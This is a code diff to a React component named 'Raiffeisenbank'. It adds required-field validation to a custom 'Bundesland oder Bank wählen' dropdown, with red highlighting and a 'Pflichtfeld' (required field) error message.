@@ -65,16 +65,17 @@ const Raiffeisenbank = () => {
           <label
             className={`pointer-events-none absolute left-3 z-10 transition-all duration-200 ${
               selectLabelFloated
-                ? "top-1 text-xs text-gray-500"
-                : "top-3 text-sm text-gray-500"
+                ? `top-1 text-xs ${bundeslandTouched && !bundesland && !selectOpen ? "text-red-600" : "text-gray-500"}`
+                : `top-3 text-sm ${bundeslandTouched && !bundesland ? "text-red-600" : "text-gray-500"}`
             }`}
           >
-            Bundesland oder Bank wählen <span className="text-gray-400">*</span>
+            Bundesland oder Bank wählen <span className={bundeslandTouched && !bundesland && !selectOpen ? "text-red-600" : "text-gray-400"}>*</span>
           </label>
           <div
             onClick={() => setSelectOpen(!selectOpen)}
+            onBlur={() => setBundeslandTouched(true)}
             className={`w-full cursor-pointer border-b-2 px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none ${
-              selectOpen ? "border-[#fbf315] bg-[#e8e8e8]" : "border-gray-300 bg-[#f4f4f4]"
+              selectOpen ? "border-[#fbf315] bg-[#e8e8e8]" : bundeslandTouched && !bundesland ? "border-red-600 bg-[#f4f4f4]" : "border-[#1a1a1a] bg-[#f4f4f4]"
             }`}
           >
             {bundesland || "\u00A0"}
@@ -98,7 +99,7 @@ const Raiffeisenbank = () => {
               }}
             >
               <div
-                onClick={() => { setBundesland(""); setSelectOpen(false); }}
+                onClick={() => { setBundesland(""); setSelectOpen(false); setBundeslandTouched(true); }}
                 className="cursor-pointer px-3 py-2 text-sm text-gray-400 hover:bg-gray-100"
               >
                 &nbsp;
@@ -106,7 +107,7 @@ const Raiffeisenbank = () => {
               {bundeslaender.map((bl) => (
                 <div
                   key={bl}
-                  onClick={() => { setBundesland(bl); setSelectOpen(false); }}
+                  onClick={() => { setBundesland(bl); setSelectOpen(false); setBundeslandTouched(true); }}
                   className={`cursor-pointer px-3 py-2 text-sm hover:bg-gray-100 ${
                     bundesland === bl ? "bg-gray-100 font-semibold" : ""
                   }`}
@@ -114,6 +115,12 @@ const Raiffeisenbank = () => {
                   {bl}
                 </div>
               ))}
+            </div>
+          )}
+          {bundeslandTouched && !bundesland && !selectOpen && (
+            <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
+              <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
+              Pflichtfeld
             </div>
           )}
         </div>
